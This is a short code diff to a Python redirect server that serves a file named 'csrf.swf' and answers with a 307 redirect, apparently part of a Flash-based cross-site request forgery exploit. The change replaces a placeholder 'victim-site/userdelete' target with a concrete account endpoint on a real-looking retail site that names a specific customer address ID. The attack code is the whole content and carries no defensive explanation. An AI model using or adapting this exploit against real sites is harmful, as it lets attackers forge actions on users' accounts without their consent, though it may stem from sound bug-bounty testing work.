@@ -15,7 +15,7 @@ class RedirectHandler(BaseHTTPServer.BaseHTTPRequestHandler):
            s.wfile.write(open("csrf.swf", "rb").read())
            return 
         s.send_response(307)
-        s.send_header("Location", "https://victim-site/userdelete")
+        s.send_header("Location", "https://account.noon.com/_svc/customer-v1/customer/addresses/106380958")
         s.end_headers()
     def do_GET(s):
         print(s.path)
